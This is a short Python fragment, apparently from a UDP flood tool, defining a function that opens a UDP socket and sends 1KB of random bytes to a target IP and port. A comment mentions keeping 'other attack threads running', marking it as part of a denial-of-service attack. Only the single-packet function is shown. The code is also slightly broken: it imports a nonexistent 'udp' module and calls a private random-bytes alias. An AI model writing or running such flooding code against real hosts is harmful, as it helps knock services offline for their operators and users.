import socket
import random # Needed for random data in packets
import udp

def send_packet(target_ip, target_port):
    """
    Sends a single UDP packet to the target IP and port.
    """
    try:
        # 1. Create a UDP socket (socket.SOCK_DGRAM)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # 2. Generate some random data for the packet payload
        packet_data = random._urandom(1024) # Sends 1KB of random data
        
        # 3. Use the socket object's sendto method
        s.sendto(packet_data, (target_ip, target_port))
        
    except Exception as e:
        # Print error but don't re-raise, to keep other attack threads running
        print(f"Failed to send packet to {target_ip}:{target_port} - {e}")
    finally:
        # Ensure the socket is closed after sending the packet
        if 's' in locals() and s: # Check if 's' was successfully created
            s.close()



